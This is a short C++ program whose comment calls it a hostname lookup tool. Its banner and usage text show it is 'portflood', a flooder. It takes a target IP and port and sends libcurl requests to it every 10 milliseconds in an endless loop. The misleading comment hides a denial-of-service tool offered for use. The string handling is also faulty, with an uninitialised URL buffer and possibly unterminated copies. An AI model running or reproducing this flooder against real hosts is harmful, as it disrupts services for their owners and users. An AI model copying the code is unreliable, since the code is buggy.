/*
Quick hostname tool,
gets hostname
-c
*/
#include <stdlib.h>
#include <iostream>
#include <string>
#include <netdb.h>
#include <iostream>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <unistd.h>

using namespace std;

int main(int argc, char *argv[]) {

char title[] = 

"\
 _______ _______ ______ _______     _______ _______ __   __ _______   \n\
|       |       |    _ |       |   |  _    |       |  |_|  |  _    |  \n\
|    _  |   _   |   | ||_     _____| |_|   |   _   |       | |_|   |  \n\
|   |_| |  | |  |   |_||_|   ||____|       |  | |  |       |       |  \n\
|    ___|  |_|  |    __  |   |     |  _   ||  |_|  |       |  _   |   \n\
|   |   |       |   |  | |   |     | |_|   |       | ||_|| | |_|   |  \n\
|___|   |_______|___|  |_|___|     |_______|_______|_|   |_|_______|  \n\
";

	char target_addr[16];
	char port[5];
	char url[24];
	
	unsigned char valid_addr[sizeof(struct in_addr)];
	CURL *curl = curl_easy_init();
	
	if(argc > 2) {
		strncpy(target_addr,argv[1],16);
		strncpy(port,argv[2],5);
	} else {
		printf("\
Usage:		\n\
	portflood [Target Address] [Port] \n\
");
		return -1;
	}

	if(inet_pton(AF_INET,target_addr,valid_addr) < 1){
		printf("Invalid IP\n");
		return -1;
	} else {
		strncat(url,target_addr,16);
		strcat(url,":");
		strncat(url,port,5);

		curl_easy_setopt(curl,CURLOPT_URL,url);
		printf("%s",title);
		while(1) {
			curl_easy_perform(curl);
			printf("Sending blank request to [ %s ]\n",url);
			usleep(10000);
		}
	}
	return 0;
}
